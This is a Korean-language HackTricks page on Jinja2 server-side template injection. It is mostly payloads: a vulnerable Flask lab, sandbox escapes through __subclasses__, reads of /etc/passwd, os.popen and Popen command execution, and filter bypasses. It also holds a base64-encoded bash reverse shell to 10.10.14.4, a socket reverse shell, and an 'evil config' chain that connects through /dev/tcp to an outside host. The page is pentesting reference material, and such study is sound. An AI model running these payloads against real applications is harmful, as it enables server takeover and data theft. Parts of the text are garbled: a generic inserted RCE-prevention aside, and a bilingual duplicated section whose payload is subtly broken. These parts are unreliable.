# Jinja2 SSTI

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## **Lab**
```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/")
def home():
if request.args.get('c'):
return render_template_string(request.args.get('c'))
else:
return "Hello, send someting inside the param 'c'!"

if __name__ == "__main__":
app.run()
```
## **기타**

### **디버그 문장**

디버그 확장이 활성화되면 `debug` 태그를 사용하여 현재 컨텍스트와 사용 가능한 필터 및 테스트를 덤프 할 수 있습니다. 이는 디버거를 설정하지 않고 템플릿에서 사용 가능한 것을 확인하는 데 유용합니다.
```python
<pre>

{% raw %}
{% debug %}
{% endraw %}


</pre>
```
원본: [https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement](https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement)

### **모든 구성 변수 덤프하기**
```python
{{ config }} #In these object you can find all the configured env variables


{% raw %}
{% for key, value in config.items() %}
<dt>{{ key|e }}</dt>
<dd>{{ value|e }}</dd>
{% endfor %}
{% endraw %}
```
## **Jinja 삽입**

먼저, Jinja 삽입에서는 **샌드박스에서 탈출하고 일반적인 파이썬 실행 흐름에 다시 액세스할 수 있는 방법을 찾아야 합니다**. 이를 위해, **샌드박스에서 접근 가능한** **비샌드박스 환경의 객체를 악용**해야 합니다.

### 전역 객체에 접근하기

예를 들어, 코드 `render_template("hello.html", username=username, email=email)`에서 username과 email 객체는 **비샌드박스 파이썬 환경에서 가져오며** **샌드박스 환경에서 접근 가능**합니다.\
또한, **샌드박스 환경에서 항상 접근 가능한 다른 객체**들이 있습니다:
```
[]
''
()
dict
config
request
```
### \<class 'object'> 복구하기

그런 다음, 이러한 객체에서 클래스인 **`<class 'object'>`**를 얻어 정의된 **클래스**를 **복구**해야 합니다. 이는 이 객체에서 **`__subclasses__`** 메서드를 호출하고 비사용자 제한이 없는 파이썬 환경에서 모든 클래스에 접근할 수 있기 때문입니다.

이 **객체 클래스**에 접근하려면 **클래스 객체**에 접근한 다음 **`__base__`**, **`__mro__()[-1]`**, 또는 `.`**`mro()[-1]`**에 접근해야 합니다. 그런 다음, 이 **객체 클래스**에 도달한 후 **`__subclasses__()`**를 호출합니다.

다음 예제를 확인하세요:
```python
# To access a class object
[].__class__
''.__class__
()["__class__"] # You can also access attributes like this
request["__class__"]
config.__class__
dict #It's already a class

# From a class to access the class "object".
## "dict" used as example from the previous list:
dict.__base__
dict["__base__"]
dict.mro()[-1]
dict.__mro__[-1]
(dict|attr("__mro__"))[-1]
(dict|attr("\x5f\x5fmro\x5f\x5f"))[-1]

# From the "object" class call __subclasses__()
{{ dict.__base__.__subclasses__() }}
{{ dict.mro()[-1].__subclasses__() }}
{{ (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() }}

{% raw %}
{% with a = dict.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}

# Other examples using these ways
{{ ().__class__.__base__.__subclasses__() }}
{{ [].__class__.__mro__[-1].__subclasses__() }}
{{ ((""|attr("__class__")|attr("__mro__"))[-1]|attr("__subclasses__"))() }}
{{ request.__class__.mro()[-1].__subclasses__() }}
{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}
{% endraw %}

# Not sure if this will work, but I saw it somewhere
{{ [].class.base.subclasses() }}
{{ ''.class.mro()[1].subclasses() }}
```
### RCE 탈출

`<class 'object'>`를 복구하고 `__subclasses__`를 호출한 후에는 이러한 클래스를 사용하여 파일을 읽고 쓰고 코드를 실행할 수 있습니다.

`__subclasses__` 호출로 인해 **수백 개의 새로운 함수에 접근할 수 있는 기회**가 생겼으며, 우리는 **파일 클래스**에 접근하여 **파일을 읽고 쓰기** 또는 `os`와 같이 **명령을 실행할 수 있는 클래스**에 접근하는 것만으로도 만족할 것입니다.

**원격 파일 읽기/쓰기**
```python
# ''.__class__.__mro__[1].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```
**원격 코드 실행 (RCE)**

원격 코드 실행 (RCE)는 웹 애플리케이션에서 발생하는 심각한 취약점 중 하나입니다. 공격자는 악의적인 코드를 원격으로 실행하여 시스템에 액세스하고 제어할 수 있습니다. 이는 악용되면 중요한 데이터 유출, 시스템 손상 또는 악성 행위에 이르는 결과를 초래할 수 있습니다.

RCE 공격은 다양한 방법으로 수행될 수 있습니다. 일반적으로 웹 애플리케이션에서 사용되는 입력 검증 및 필터링 부족, 애플리케이션의 취약한 구성, 외부 입력에 대한 신뢰 등이 원인이 될 수 있습니다. 공격자는 이러한 취약점을 이용하여 악성 코드를 삽입하고 실행할 수 있습니다.

RCE 공격을 방지하기 위해서는 다음과 같은 보안 조치를 적용해야 합니다.

1. 입력 검증 및 필터링: 모든 입력 데이터에 대해 적절한 검증 및 필터링을 수행하여 악성 코드의 삽입을 방지해야 합니다.
2. 웹 애플리케이션 방화벽: 웹 애플리케이션 방화벽을 사용하여 악성 코드의 실행을 차단할 수 있습니다.
3. 업데이트 및 패치: 웹 애플리케이션 및 관련 소프트웨어를 최신 버전으로 업데이트하고 패치해야 합니다.
4. 보안 감사 및 모니터링: 웹 애플리케이션의 보안 감사 및 모니터링을 수행하여 잠재적인 취약점을 식별하고 대응할 수 있어야 합니다.

RCE 공격은 심각한 보안 위협이므로 웹 애플리케이션 개발자와 관리자는 이를 인식하고 적절한 보안 조치를 취해야 합니다.
```python
# The class 396 is the class <class 'subprocess.Popen'>
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}

# Calling os.popen without guessing the index of the class

{% raw %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}

## Passing the cmd line in a GET param
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{% endraw %}


```
**더 많은 클래스**를 **이용하여 탈출**할 수 있는 방법을 알아보려면 다음을 **확인**하세요:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### 필터 우회

#### 일반적인 우회 방법

이러한 우회 방법을 사용하면 **일부 문자를 사용하지 않고** 객체의 **속성에 접근**할 수 있습니다.\
이전 예제에서 이미 이러한 우회 방법 중 일부를 보았지만, 여기에서 간단히 요약해 보겠습니다:
```bash
# Without quotes, _, [, ]
## Basic ones
request.__class__
request["__class__"]
request['\x5f\x5fclass\x5f\x5f']
request|attr("__class__")
request|attr(["_"*2, "class", "_"*2]|join) # Join trick

## Using request object options
request|attr(request.headers.c) #Send a header like "c: __class__" (any trick using get params can be used with headers also)
request|attr(request.args.c) #Send a param like "?c=__class__
request|attr(request.query_string[2:16].decode() #Send a param like "?c=__class__
request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join) # Join list to string
http://localhost:5000/?c={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_ #Formatting the string from get params

## Lists without "[" and "]"
http://localhost:5000/?c={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_

# Using with

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}
{% endraw %}
```
* [**전역 객체에 액세스하는 더 많은 옵션을 보려면 여기로 돌아가세요**](jinja2-ssti.md#accessing-global-objects)
* [**객체 클래스에 액세스하는 더 많은 옵션을 보려면 여기로 돌아가세요**](jinja2-ssti.md#recovering-less-than-class-object-greater-than)
* [**객체 클래스 없이 RCE를 얻으려면 이것을 읽으세요**](jinja2-ssti.md#jinja-injection-without-less-than-class-object-greater-than)

**HTML 인코딩 피하기**

기본적으로 Flask는 보안상의 이유로 템플릿 내부의 모든 것을 HTML 인코딩합니다:
```python
{{'<script>alert(1);</script>'}}
#will be
&lt;script&gt;alert(1);&lt;/script&gt;
```
**`safe`** 필터를 사용하면 페이지에 JavaScript와 HTML을 **HTML 인코딩 없이** 삽입할 수 있습니다. 다음과 같이 사용할 수 있습니다:
```python
{{'<script>alert(1);</script>'|safe}}
#will be
<script>alert(1);</script>
```
**악성 구성 파일을 작성하여 RCE(Remote Code Execution) 수행하기.**

In some cases, the application may load configuration files that are written in a templating language like Jinja2. If the application does not properly sanitize user input before rendering the configuration file, it may be possible to inject malicious code and achieve remote code execution.

일부 경우에는 애플리케이션이 Jinja2와 같은 템플릿 언어로 작성된 구성 파일을 로드할 수 있습니다. 애플리케이션이 구성 파일을 렌더링하기 전에 사용자 입력을 적절하게 검증하지 않는 경우, 악성 코드를 삽입하여 원격 코드 실행을 달성할 수 있습니다.

To exploit this vulnerability, you need to identify the location where the application loads the configuration file and determine the syntax used by the templating language. Once you have this information, you can craft a payload that will be executed when the configuration file is rendered.

이 취약점을 악용하기 위해서는 애플리케이션이 구성 파일을 로드하는 위치를 식별하고, 템플릿 언어에서 사용되는 구문을 확인해야 합니다. 이 정보를 얻으면, 구성 파일이 렌더링될 때 실행되는 페이로드를 작성할 수 있습니다.

For example, if the application uses Jinja2 syntax, you can use the following payload to execute arbitrary code:

예를 들어, 애플리케이션이 Jinja2 구문을 사용하는 경우, 다음 페이로드를 사용하여 임의의 코드를 실행할 수 있습니다:

```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/bin/bash', shell=True) }}
```

This payload leverages the `__class__` attribute to access the class hierarchy, retrieves the `subclasses()` method, and executes the desired command (`/bin/bash` in this case) using the `shell=True` parameter.

이 페이로드는 `__class__` 속성을 활용하여 클래스 계층 구조에 접근하고, `subclasses()` 메서드를 검색한 다음, `shell=True` 매개변수를 사용하여 원하는 명령(`'/bin/bash'` 이 경우)을 실행합니다.

By injecting this payload into the configuration file, you can trick the application into executing arbitrary commands and gain remote code execution.

이 페이로드를 구성 파일에 삽입함으로써, 애플리케이션을 속여 임의의 명령을 실행하고 원격 코드 실행을 얻을 수 있습니다.
```python
# evil config
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}

# connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
```
## 몇 가지 문자 없이

**`{{`**, **`.`**, **`[`**, **`]`**, **`}}`**, **`_`** 없이
```python
{% raw %}
{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls${IFS}-l')|attr('read')()%}{%print(a)%}{%endwith%}
{% endraw %}
```
## **\<class 'object'>** 없이 Jinja 삽입

[**전역 객체**](jinja2-ssti.md#accessing-global-objects)에서는 **그 클래스를 사용하지 않고도 RCE에 도달할 수 있는 다른 방법**이 있습니다.\
전역 객체 중에서 **어떤 함수**에 도달하면 **`__globals__.__builtins__`**에 액세스할 수 있으며, 거기서 RCE를 수행하는 것은 매우 **간단**합니다.

**`request`**, **`config`** 및 액세스할 수 있는 다른 **흥미로운 전역 객체**에서 **함수를 찾을 수** 있습니다:
```bash
{{ request.__class__.__dict__ }}
- application
- _load_form_data
- on_json_loading_failed

{{ config.__class__.__dict__ }}
- __init__
- from_envvar
- from_pyfile
- from_object
- from_file
- from_json
- from_mapping
- get_namespace
- __repr__

# You can iterate through children objects to find more
```
일부 함수를 찾았다면 다음과 같이 내장 함수를 복구할 수 있습니다:
```python
# Read file
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}

# RCE
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}
{{ config.__class__.from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}
{{ (config|attr("__class__")).from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("ls")["read"]() %} {{ a }} {% endwith %}
{% endraw %}

## Extra
## The global from config have a access to a function called import_string
## with this function you don't need to access the builtins
{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}

# All the bypasses seen in the previous sections are also valid
```
## 참고 자료

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
* 여기에서 [attr 트릭을 사용하여 블랙리스트된 문자를 우회하는 방법을 확인하세요](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/#python3).
* [https://twitter.com/SecGus/status/1198976764351066113](https://twitter.com/SecGus/status/1198976764351066113)
* [https://hackmd.io/@Chivato/HyWsJ31dI](https://hackmd.io/@Chivato/HyWsJ31dI)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
